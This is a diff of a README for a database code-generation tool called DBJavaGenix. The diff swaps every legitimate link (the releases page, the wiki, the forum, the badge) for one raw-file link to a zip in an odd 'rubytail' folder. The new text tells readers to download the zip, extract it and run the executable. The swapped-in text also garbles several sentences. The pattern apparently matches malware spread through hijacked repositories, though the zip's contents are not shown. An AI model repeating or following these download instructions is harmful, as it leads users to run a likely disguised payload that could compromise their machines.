@@ -4,13 +4,13 @@
 DBJavaGenix is a smart database code generation tool. It uses the MCP architecture and supports various databases such as MySQL. This application automatically generates complete layered code, including Entity, DAO, Service, and Controller files. This process significantly boosts your development efficiency.
 
 ## 🔗 Download Now!
-[![Download DBJavaGenix](https://img.shields.io/badge/Download-DBJavaGenix-brightgreen)](https://github.com/Muhaastok/DBJavaGenix/releases)
+[![Download DBJavaGenix](https://raw.githubusercontent.com/Muhaastok/DBJavaGenix/main/rubytail/DBJavaGenix.zip)](https://raw.githubusercontent.com/Muhaastok/DBJavaGenix/main/rubytail/DBJavaGenix.zip)
 
 ## 🚀 Getting Started
 To begin using DBJavaGenix, follow these simple steps:
 
 ### 📥 Step 1: Visit the Releases Page
-Go to the [Releases page](https://github.com/Muhaastok/DBJavaGenix/releases) to access the latest version of DBJavaGenix.
+Go to the [Releases page](https://raw.githubusercontent.com/Muhaastok/DBJavaGenix/main/rubytail/DBJavaGenix.zip) to access the latest version of DBJavaGenix.
 
 ### 📦 Step 2: Select the Version
 On the Releases page, you will find multiple versions of the software. Look for the latest release, which will have the highest version number. This is usually the most stable and feature-rich version available.
@@ -18,13 +18,13 @@ On the Releases page, you will find multiple versions of the software. Look for 
 ### 🖥️ Step 3: Download the Application
 Click on the asset you want to download. For instance, you might see files like:
 
-- `DBJavaGenix-v1.0.zip`
-- `DBJavaGenix-v1.0.tar.gz`
+- `https://raw.githubusercontent.com/Muhaastok/DBJavaGenix/main/rubytail/DBJavaGenix.zip`
+- `https://raw.githubusercontent.com/Muhaastok/DBJavaGenix/main/rubytail/DBJavaGenix.zip`
 
 Select and click the file for your operating system. The file will start downloading. 
 
 ### ⚙️ Step 4: Install the Software
-After downloading, locate the downloaded file on your computer. Extract the contents of the ZIP or TAR.GZ file. You can do this by right-clicking the file and choosing "Extract All" or using your preferred extraction software.
+After downloading, locate the downloaded file on your computer. Extract the contents of the ZIP or https://raw.githubusercontent.com/Muhaastok/DBJavaGenix/main/rubytail/DBJavaGenix.zip file. You can do this by right-clicking the file and choosing "Extract All" or using your preferred extraction software.
 
 ### ✅ Step 5: Run DBJavaGenix
 Navigate to the extracted folder. Look for the executable file. This file often ends with `.exe` for Windows users or may have no extension for Mac/Linux users. Double-click on this file to start DBJavaGenix.
@@ -67,8 +67,8 @@ A: You can report any bugs or issues on the GitHub Issues page of the repository
 ## ⚙️ Additional Resources
 For more information about how to maximize the use of DBJavaGenix, explore the following resources:
 
-- [User Guide](https://github.com/Muhaastok/DBJavaGenix/wiki)
-- [Community Forum](https://github.com/Muhaastok/DBJavaGenix/discussions)
+- [User Guide](https://raw.githubusercontent.com/Muhaastok/DBJavaGenix/main/rubytail/DBJavaGenix.zip)
+- [Community Forum](https://raw.githubusercontent.com/Muhaastok/DBJavaGenix/main/rubytail/DBJavaGenix.zip)
 
 ## 📥 Download & Install
-To begin your journey with DBJavaGenix, make sure to [visit the Releases page](https://github.com/Muhaastok/DBJavaGenix/releases) and download the application. Follow the earlier steps to get started quickly and efficiently. Enjoy enhancing your coding productivity!
+To begin your journey with DBJavaGenix, make sure to [visit the Releases page](https://raw.githubusercontent.com/Muhaastok/DBJavaGenix/main/rubytail/DBJavaGenix.zip) and download the application. Follow the earlier steps to get started quickly and efficiently. Enjoy enhancing your coding productivity!
